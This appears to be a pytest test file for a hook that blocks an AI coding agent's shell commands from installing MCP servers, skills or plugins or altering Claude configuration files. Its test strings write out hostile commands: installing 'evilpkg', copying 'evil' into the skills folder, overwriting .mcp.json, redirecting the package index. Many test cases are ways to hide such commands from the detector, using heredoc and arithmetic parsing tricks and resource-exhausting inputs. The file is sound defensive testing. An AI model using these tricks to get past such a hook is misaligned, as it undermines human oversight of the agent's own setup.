    "claude mcp add x -e npm_config_userconfig=/tmp/npmrc -- npx -y okpkg",
    "claude mcp add x -e PIP_CONFIG_FILE=/tmp/pip.conf -- uvx okpkg",
    "claude mcp add x -e UV_CONFIG_FILE=/tmp/uv.toml -- uvx okpkg",
    "claude mcp add x -e UV_INDEX_EVIL_URL=http://e -- uvx okpkg",
])
def test_index_config_protected(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and r.protected, r
    assert [t.name for t in r.targets] == ["okpkg"]


def test_npx_value_flags_not_taken_as_package(home):
    for flags in ("--registry http://x", "--userconfig /tmp/rc", "--node-options x", "--cache /tmp/c"):
        t = detect_install(bash(f"claude mcp add x -- npx {flags} -y okpkg")).targets[0]
        assert t.name == "okpkg", flags


def test_glob_prefilter_fast_path_for_ordinary_copies(home):
    hook = _load_hook()
    for cmd in ("cp -r dist/* build/", "mv src/*.py lib/", "cp *.txt out/", "cp foo[1].txt out/"):
        assert not hook.prefilter({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": "/tmp"}), cmd
        assert detect_install(bash(cmd)) is None, cmd
    assert detect_install(bash("cp x out*/")) is None  # no match, not under a dot dir: no decision


def _round2_positive_cases(home: Path) -> list[HookInput]:
    proj = str(home.parent / "proj")
    return [bash(c, cwd=proj) for c in (
        HEREDOC_PY,
        "echo \"open('.mcp.json','w')\" | python3",
        "cat > /tmp/a.py <<EOF\nopen('.mcp.json','w')\nEOF\npython3 /tmp/a.py",
        "uv run python -c \"open('$HOME/.claude.json','w').write('{}')\"",
        "cd ~/.claude && python3 -c \"open('settings.json','w').write('{}')\"",
        "echo '{}' | tee -a ~/.claude/settings.json",
        "dd if=evil of=.mcp.json",
        "claude mcp add x -- npx --userconfig /tmp/npmrc -y okpkg",
        "claude mcp add x -- pipx run --spec evil okpkg",
        "cp -r evil ~/.x*/skills/",
        "cp -r evil ../.c*/skills/",
    )]


def test_prefilter_superset_round2(home):
    hook = _load_hook()
    for inp in _round2_positive_cases(home):
        assert detect_install(inp) is not None, inp
        assert hook.prefilter({"tool_name": inp.tool_name, "tool_input": inp.tool_input, "cwd": inp.cwd}), inp


# ------------------------------------------------------------- fix round 3

@pytest.mark.parametrize("cmd,kind", [
    ('echo "<<EOF"\ncp -r evil ~/.claude/skills/', "local"),
    ("echo $((1<<FOO))\nclaude mcp add x -- npx evilpkg", "npm"),
    ("# see <<END\nclaude plugin install foo@mk", "local"),
    ("cat <<< foo\nclaude mcp add x -- npx evilpkg", "npm"),
    ("echo '<<X'\nclaude mcp add x -- npx evilpkg\nX", "npm"),
    ("cat <<EOF\nunterminated\nclaude mcp add x -- npx evilpkg", "npm"),
])
def test_heredoc_misparse_never_hides_commands(home, cmd, kind):
    proj = home.parent / "proj"
    (proj / "evil").mkdir()
    r = detect_install(bash(cmd, cwd=str(proj)))
    assert isinstance(r, Targets) and r.targets[0].kind == kind, r


@pytest.mark.parametrize("cmd", [
    "bash <<EOF\nclaude mcp add x -- npx evilpkg\nEOF",
    "sh <<'EOF'\nclaude mcp add x -- npx evilpkg\nEOF",
    "cat > /tmp/i.sh <<EOF\nclaude mcp add x -- npx evilpkg\nEOF\nbash /tmp/i.sh",
    "bash <<< 'claude mcp add x -- npx evilpkg'",
    "cat <<EOF > /tmp/notes.txt\nclaude mcp add x -- npx evilpkg\nEOF",  # fail-safe: every body is scanned
])
def test_heredoc_bodies_parsed_as_commands(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and [t.name for t in r.targets] == ["evilpkg"], r


@pytest.mark.parametrize("cmd", [
    "mv ~/.claude/settings.json /tmp/bak.json",
    "mv {proj}/.mcp.json /tmp/x",
    "mv ~/.claude.json /tmp/x",
    "rsync -a --remove-source-files ~/.claude/settings.json /tmp/x",
    "mv ~/.claude/plugins /tmp/p",
    "mv ~/.claude ~/claude-old",
    "mv ~/.bawwab /tmp/b",
    "mv ~ /tmp/oldhome",
    "rsync -a --delete empty/ ~/.claude/",
])
def test_moving_config_protected(home, cmd):
    proj = home.parent / "proj"
    r = detect_install(bash(cmd.format(proj=proj), cwd=str(proj)))
    assert isinstance(r, Protected), r


def test_rsync_without_remove_source_is_not_a_move(home):
    assert detect_install(bash("rsync -a ~/.claude/settings.json /tmp/x")) is None
    assert detect_install(bash("cp ~/.claude/settings.json /tmp/x")) is None


@pytest.mark.parametrize("cmd,cwd", [
    ("python3 ~/.claude/skills/pdf/scripts/fill.py", "/tmp"),
    ("node ~/.claude/plugins/cache/mk/p/1.0/scripts/a.js --flag", "/tmp"),
    ("cd ~/.claude/skills/pdf && python3 scripts/fill.py", "/tmp"),
    ("bash ~/.claude/skills/x/run.sh", "/tmp"),
])
def test_running_bundled_scripts_is_execute(home, cmd, cwd):
    assert detect_install(bash(cmd, cwd=cwd)) is None


@pytest.mark.parametrize("cmd", [
    "python3 ~/.claude/skills/pdf/scripts/fill.py ~/.claude/settings.json",
    "python3 ~/.claude/skills/pdf/scripts/fill.py --out .mcp.json",
    "echo \"open('.mcp.json','w')\" | python3 ~/.claude/skills/x/a.py",
])
def test_bundled_script_with_sensitive_args_protected(home, cmd):
    assert isinstance(detect_install(bash(cmd, cwd=str(home.parent / "proj"))), Protected)


@pytest.mark.parametrize("flags", [
    "--loglevel warn", "--cache /tmp/c", "--prefix /tmp/p", "-c 'echo hi'", "--call x", "-w ws",
    "--workspace ws", "--globalconfig /tmp/g",
])
def test_npx_more_value_flags(home, flags):
    r = detect_install(bash(f"claude mcp add x -- npx {flags} okpkg"))
    assert r.targets[0].name == "okpkg", flags


def _round3_positive_cases(home: Path) -> list[HookInput]:
    proj = str(home.parent / "proj")
    return [bash(c, cwd=proj) for c in (
        'echo "<<EOF"\ncp -r evil ~/.claude/skills/',
        "echo $((1<<FOO))\nclaude mcp add x -- npx evilpkg",
        "cat <<< foo\nclaude mcp add x -- npx evilpkg",
        "bash <<EOF\nclaude mcp add x -- npx evilpkg\nEOF",
        "cat > /tmp/i.sh <<EOF\nclaude mcp add x -- npx evilpkg\nEOF\nbash /tmp/i.sh",
        "mv ~/.claude/settings.json /tmp/bak.json",
        "mv .mcp.json /tmp/x",
        "rsync -a --remove-source-files ~/.claude/settings.json /tmp/x",
        "mv ~/.bawwab /tmp/b",
        "mv ~ /tmp/oldhome",
        "python3 ~/.claude/skills/pdf/scripts/fill.py ~/.claude/settings.json",
    )]


def test_prefilter_superset_round3(home):
    (home.parent / "proj" / "evil").mkdir(exist_ok=True)
    hook = _load_hook()
    for inp in _round3_positive_cases(home):
        assert detect_install(inp) is not None, inp
        assert hook.prefilter({"tool_name": inp.tool_name, "tool_input": inp.tool_input, "cwd": inp.cwd}), inp


# ------------------------------------------------------------- fix round 4

import time  # noqa: E402

_E = "claude mcp add x -- npx evilpkg"


def _timed(cmd: str, cwd: str = "/tmp"):
    t = time.perf_counter()
    r = detect_install(bash(cmd, cwd=cwd))
    return r, time.perf_counter() - t


def _detected_or_too_complex(r) -> bool:
    if isinstance(r, Targets):
        return "evilpkg" in [t.name for t in r.targets]
    return isinstance(r, Protected) and "too complex" in r.reason


@pytest.mark.parametrize("cmd", [
    "\n".join(["cat <<A"] * 200) + "\n" + _E,
    "\n".join(["bash <<A"] * 200) + "\n" + _E,
    "\n".join(["sh <<A"] * 200) + "\n" + _E,
    "\n".join(["python3 <<A"] * 200) + "\n" + _E,
    "\n".join([f"cat <<A{i}" for i in range(200)]) + "\n" + _E,
    "\n".join(["(( a << 1 ))"] * 200) + "\n" + _E,
    "\n".join(["let a=a<<1"] * 200) + "\n" + _E,
    "\n".join(["cat <<A\nx\nA"] * 1000) + "\n" + _E,
    "cat <<A\n" + "x y z\n" * 40000 + "A\n" + _E,
    "cat " + " ".join(["<<A"] * 200) + "\n" + "x\nA\n" * 200 + _E,
    "\n".join(["bash <<A\nbash <<B\nbash <<C"] * 60) + "\n" + _E,
])
def test_heredoc_scanning_is_bounded(home, cmd):
    r, dt = _timed(cmd)
    assert dt < 1.0, dt
    assert _detected_or_too_complex(r), r


def test_work_budget_fails_closed_fast(home):
    cmd = "python3 <<A\n" * 5000 + _E  # each segment's stdin is the whole unterminated remainder
    r, dt = _timed(cmd)
    assert dt < 1.0, dt
    assert isinstance(r, Protected) and r.reason == "command too complex to analyse", r
    assert _load_hook().prefilter({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": "/tmp"})


def test_shell_heredoc_body_scanned_once(home, monkeypatch):
    import bawwab.gate.detect as d
    calls: list[str] = []  # texts actually analysed (_bash returns early for an already-scanned pair)
    orig = d._extract_heredocs

    def counting(cmd, *a, **k):
        calls.append(cmd)
        return orig(cmd, *a, **k)

    monkeypatch.setattr(d, "_extract_heredocs", counting)
    body = "claude mcp add x -- npx evilpkg"
    r = detect_install(bash(f"bash <<EOF\n{body}\nEOF\ncat <<EOF\n{body}\nEOF"))
    assert isinstance(r, Targets) and [t.name for t in r.targets] == ["evilpkg"], r
    assert calls.count(body) == 1, calls


@pytest.mark.parametrize("cmd", [
    # bash treats `let a<<X` as a real heredoc, so its body must not be re-read as command lines
    "let b=1<<X\n'\nX\n" + _E + "\necho '",
    # `((…) )` is nested subshells, not arithmetic: the heredoc is real
    "((cat <<X) )\n'\nX\n" + _E + "\necho '",
    # arithmetic shifts are not heredocs
    "(( a << X ))\n" + _E + "\nX",
    "if (( a <<1 )); then echo; fi\n" + _E + "\n1",
    "cat <<A\nx\n" + _E,  # unterminated: the rest is still scanned in place
])
def test_round4_hiding_resistance(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets], r


def test_unterminated_interpreter_heredoc_still_checked(home):
    r = detect_install(bash(f"python3 <<A\nopen('{home}/.claude.json', 'w').write('x')"))
    assert isinstance(r, Protected), r


# ------------------------------------------------------------- fix round 5

@pytest.mark.parametrize("cmd", [
    # `))` inside quotes or escaped does not close `((`: bash reads nested subshells with a real heredoc
    "((cat <<X '))' ) )\n'\nX\n" + _E + "\necho '",
    '((cat <<X "))" ) )\n"\nX\n' + _E + '\necho "',
    "((cat <<X \\)) ) )\n'\nX\n" + _E + "\necho '",
    "((cat <<X # ))\n'\nX\n" + _E + "\necho '",
    # a clean `(( … << … ))` is arithmetic in bash (verified): treating it as a heredoc would hide this
    "(( a << X ))\nfoo '\nX\n'\n" + _E + "\necho '",
])
def test_arith_quote_bypass(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets], r


def test_budget_charged_before_building_text(home):
    import tracemalloc
    cmd = f"cat > /tmp/f <<A\n{'x' * 150000}\nA\npython3 " + "/tmp/f " * 20000 + "\n" + _E
    r, dt = _timed(cmd)
    assert dt < 1.0, dt
    tracemalloc.start()  # second, untimed run (tracing slows it down) for the allocation peak
    try:
        detect_install(bash(cmd))
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 200 * 2**20, peak
    assert isinstance(r, (Protected, Targets)), r


@pytest.mark.parametrize("cmd", [
    "(cd /tmp); bash <<EOF\ncp -r ../evil skills/x\nEOF",
    "cd /nonexist; bash <<EOF\ncp -r ../evil skills/x\nEOF",
    "cd /tmp\nbash <<EOF\ncp -r ../evil skills/x\nEOF\ncd -\n",
])
def test_failsafe_body_scan_keeps_start_cwd(home, cmd):
    (home / ".claude" / "skills").mkdir(parents=True, exist_ok=True)
    (home / "evil").mkdir(exist_ok=True)
    r = detect_install(bash(cmd, cwd=str(home / ".claude")))
    assert isinstance(r, Targets) and r.targets[0].path == str(home / "evil"), r


# ------------------------------------------------------------- R24: both readings of arithmetic regions

_HIDE = "\nfoo '\nX\n'\n" + _E + "\necho '"  # hides _E iff `<<X` before it is read as a heredoc


@pytest.mark.parametrize("prefix", [
    "for (( i=0; i<<X; i++ )); do :; done",
    "(( a=1; b << X ))",
    "(( $(true) << X ))",
    "(( ${a} << X ))",
    '(( "a" << X ))',
    "(( `true` << X ))",
    "(( a << X\n ))",
    "echo $[ a << X ]",
])
def test_r24_arith_region_both_readings(home, prefix):
    # bash reads each of these as arithmetic, so `<<X` opens no heredoc and the hidden line runs
    r = detect_install(bash(prefix + _HIDE))
    assert isinstance(r, Protected) or (isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets]), r


@pytest.mark.parametrize("cmd", [
    "((cat <<X '))' ) )\n'\nX\n" + _E + "\necho '",  # nested subshells: the heredoc is real
    '((cat <<X "))" ) )\n"\nX\n' + _E + '\necho "',
    "((cat <<X) )\n'\nX\n" + _E + "\necho '",
    "$( (cat <<X) )\n'\nX\n" + _E + "\necho '",
])
def test_r24_real_heredoc_in_paren_region(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets], r


@pytest.mark.parametrize("cmd", [
    "for ((i=0;i<3;i++)); do echo $i; done",
    "(( x = 1 << 3 ))",
    "echo $(( 2 << 4 ))",
    "echo $[ 1 << 2 ]",
    "let 'x = 1 << 2'",
])
def test_r24_benign_arith_is_none(home, cmd):
    assert detect_install(bash(cmd)) is None


@pytest.mark.parametrize("cmd", [
    "\n".join(["(( a << X ))"] * 200) + "\n" + _E,
    "\n".join(["echo $[ a << X ]"] * 200) + "\n" + _E,
    "((\n" * 20000 + _E,  # unclosed regions: the region finder must not go quadratic
    "$[\n" * 20000 + _E,
    f"cat > /tmp/f <<A\n{'x' * 150000}\nA\npython3 " + "/tmp/f " * 20000 + "\n" + _E,  # r4/a5
    f"(( a << X ))\ncat > /tmp/f <<A\n{'x' * 150000}\nA\npython3 " + "/tmp/f " * 20000 + "\n" + _E,
])
def test_r24_both_readings_bounded(home, cmd):
    r, dt = _timed(cmd)
    assert dt < 1.0, dt
    assert _detected_or_too_complex(r) or isinstance(r, Protected), r


def test_r24_mixed_readings_small_k(home):
    # region 1 is arithmetic, region 2 nested subshells with a real heredoc: neither uniform reading sees _E
    cmd = "(( a << X )); ((cat <<Y ')' ) )\n'\nY\n" + _E + "\nX\nY\n'"
    r = detect_install(bash(cmd))
    assert isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets], r


def test_hook_prefilter_raising_takes_slow_path(monkeypatch, capsys):
    hook = _load_hook()
    calls: list[str] = []

    def boom(data):
        raise ValueError("embedded null byte")

    monkeypatch.setattr(hook, "prefilter", boom)
    monkeypatch.setattr(hook, "_run_gate", lambda raw: calls.append(raw) or None)
    monkeypatch.setattr(hook.sys, "stdin", __import__("io").StringIO(json.dumps(
        {"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": "/tmp"})))
    assert hook.gate() == 0
    assert len(calls) == 1


@pytest.mark.parametrize("cmd", [
    # 4 filler regions push past mixed-reading enumeration; the real reading mixes arithmetic and a heredoc
    "(( 1 )); (( 2 )); (( 3 )); (( 4 )); (( a << X )); ((cat <<Y ')' ) )\n'\nY\n" + _E + "\nX\nY\n'",
    "(( a << X )); (( b << Y )); ((cat <<Z ')' ) ); ((cat <<W ')' ) )\n'\nZ\n'\nW\n" + _E + "\nX\nY\n'",
])
def test_r24_many_regions_with_heredoc_op_fail_closed(home, cmd):
    r = detect_install(bash(cmd))
    assert isinstance(r, Protected) or (isinstance(r, Targets) and "evilpkg" in [t.name for t in r.targets]), r


def test_r24_many_regions_without_heredoc_op_still_none(home):
    assert detect_install(bash("(( a = 1 )); (( b = 2 )); (( c = 3 )); (( d = 4 )); echo $(( a + b ))")) is None
